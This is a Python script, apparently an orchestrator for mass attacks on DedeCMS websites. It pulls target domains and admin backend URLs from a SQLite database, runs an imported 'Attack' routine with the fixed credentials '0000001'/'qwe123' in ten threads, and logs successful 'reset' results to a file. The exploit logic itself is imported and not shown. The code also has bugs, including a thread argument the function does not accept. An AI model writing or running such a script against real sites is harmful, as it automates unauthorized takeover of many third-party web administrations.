# -*- coding: utf-8 -*-

from common import utils
import requests
import traceback
import re
from PIL import Image
from lxml import etree
import time
from threading import Thread
from auto_dede import 找空间
from unit import dbsqlite

def attack():
    while True:
        domain_model = dbsqlite.start_getlist(' status = 6 ')
        if not domain_model:
            print('线程：%d为查到符合条件数据,等待3s' % i)
            time.sleep(3)
            continue
        status = 10
        domain = domain_model[1]
        back_ground_url = domain_model[5]

        atk = 找空间.Attack(domain=domain, user="0000001", pwd="qwe123", back_ground_url=back_ground_url)
        res = atk.start()
        str_res = "domain:%s, info:%s" % (res["domain"], res["info"])
        print(str_res)
        if res["res"]:
            with open(file="./res/重置结果.txt", mode="a", encoding="utf-8") as fp:
                fp.write(str_res + "\n")
            status = 9
        else:
            status = 10
        dbsqlite.data_update(domain, "status = %d,des = '%s'" % (status, res["info"]))

if __name__ == '__main__':
    # task()
    try:
        Threads = []
        for i in range(10):
            t = Thread(target=attack, args=(i,))
            t.daemon = 1
            Threads.append(t)
            t.start()
        # 启动所有线程
        for i in Threads:
            i.join()
    except Exception as e:
        print(e)
